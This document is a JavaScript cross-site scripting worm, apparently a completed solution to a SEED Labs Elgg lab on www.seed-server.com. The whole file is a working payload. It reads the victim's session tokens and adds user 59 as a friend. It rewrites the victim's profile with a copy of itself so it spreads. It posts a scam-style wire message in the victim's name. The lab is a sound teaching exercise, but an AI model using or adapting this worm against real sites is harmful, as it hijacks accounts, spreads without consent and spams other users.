<script id="worm" type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the HTTP request to add Samy as a friend.

        var sendurl=`http://www.seed-server.com/action/friends/add?friend=59${ts}${token}`; //FILL IN

        //Create and send Ajax request to add friend
        var guid = elgg.session.user.guid;
        if(guid !== 59){
            Ajax=new XMLHttpRequest();
            Ajax.open("GET",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send();
        }
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = headerTag + jsCode + tailTag;
        //Construct the content of your url.
            sendurl=`http://www.seed-server.com/action/profile/edit`; //FILL IN
            var content = {
                "__elgg_token": elgg.security.token.__elgg_token,
                "__elgg_ts": elgg.security.token.__elgg_ts,
                "name": elgg.session.user.name,
                "description": wormCode,
                "accesslevel[description]": "1",
                "briefdescription": "Samy is my hero",
                "accesslevel[briefdescription]": "1",
                "location": "Samy's heart",
                "accesslevel[location]": "1",
                "interests": "To know Samy",
                "accesslevel[interests]": "1",
                "skills": "I like to be Samy",
                "accesslevel[skills]": "1",
                "contactemail": "alisam@yahoo.com",
                "accesslevel[contactemail]": "1",
                "phone": "1234567890",
                "accesslevel[phone]": "1",
                "mobile": "1234567890",
                "accesslevel[mobile]": "1",
                "website": "www.samyhackworld.com",
                "accesslevel[website]": "1",
                "twitter": "samy",
                "accesslevel[twitter]": "1",
                "guid": elgg.session.user.guid
            };
            
            var formBody = new URLSearchParams(content).toString();
        
        if(guid !== 59)
        {
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(formBody);
        }
        var username = elgg.session.user.username;
        var wirepost = {
            "body" : `To earn 12 USD/Hour (!), visit now http://www.seed-server.com/profile/${username}`
        };
        
        // Constructing the HTTP POST request(url & content) to post on the wire on behalf of the victim
        sendurl = 'http://www.seed-server.com/action/thewire/add';
        content = new URLSearchParams({
            "__elgg_token": elgg.security.token.__elgg_token,
            "__elgg_ts": elgg.security.token.__elgg_ts,
            ...wirepost
        }).toString();
        
        /* creating and sending Ajax request to post on the wire on behalf of the victim */
        if(guid !== 59) {
            var Ajax = null;
            Ajax = new XMLHttpRequest();
            Ajax.open('POST', sendurl, true);
            Ajax.setRequestHeader('Host', 'www.seed-server.com');
            Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            Ajax.send(content);
        }
    }
</script>